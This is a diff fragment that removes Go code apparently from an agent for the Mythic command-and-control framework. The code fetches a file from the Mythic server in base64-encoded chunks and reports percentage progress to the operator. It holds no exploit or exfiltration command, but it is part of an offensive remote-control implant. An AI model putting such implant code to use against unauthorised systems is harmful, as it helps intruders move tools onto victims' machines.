-		getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
-		return
-	}
-	getFileFromMythic.ReceivedChunkChannel <- decoded
-	// track the percentage of completion for file transfer for users so it's easier to see
-	lastPercentCompleteNotified := 0
-	if fileUploadMsgResponse.TotalChunks > 1 {
-		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
-			if getFileFromMythic.Task.ShouldStop() {
-				getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
-				return
-			}
-			// update to the next chunk
-			fileUploadMsg.Upload.ChunkNum = index
-			// send the request
-			getFileFromMythic.Task.Job.SendResponses <- fileUploadMsg
-			// get the response
-			rawData := <-getFileFromMythic.FileTransferResponse
-			fileUploadMsgResponse = structs.FileUploadMessageResponse{} // Unmarshal the file upload response from apfell
-			err := json.Unmarshal(rawData, &fileUploadMsgResponse)
-			if err != nil {
-				errResponse := structs.Response{}
-				errResponse.Completed = true
-				errResponse.TaskID = getFileFromMythic.Task.TaskID
-				errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
-				getFileFromMythic.Task.Job.SendResponses <- errResponse
-				getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
-				return
-			}
-			// Base64 decode the chunk data
-			decoded, err := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
-			if err != nil {
-				errResponse := structs.Response{}
-				errResponse.Completed = true
-				errResponse.TaskID = getFileFromMythic.Task.TaskID
-				errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
-				getFileFromMythic.Task.Job.SendResponses <- errResponse
-				getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
-				return
-			}
-			getFileFromMythic.ReceivedChunkChannel <- decoded
-			newPercentComplete := ((index * 100) / fileUploadMsgResponse.TotalChunks)
-			if newPercentComplete/10 > lastPercentCompleteNotified && getFileFromMythic.SendUserStatusUpdates {
-				response := structs.Response{}
-				response.Completed = false
-				response.TaskID = getFileFromMythic.Task.TaskID
-				response.UserOutput = fmt.Sprintf("File Transfer Update: %d%% complete\n", newPercentComplete)
-				getFileFromMythic.Task.Job.SendResponses <- response
-				lastPercentCompleteNotified = newPercentComplete / 10
-			}
-		}
-	}
-	getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
 }
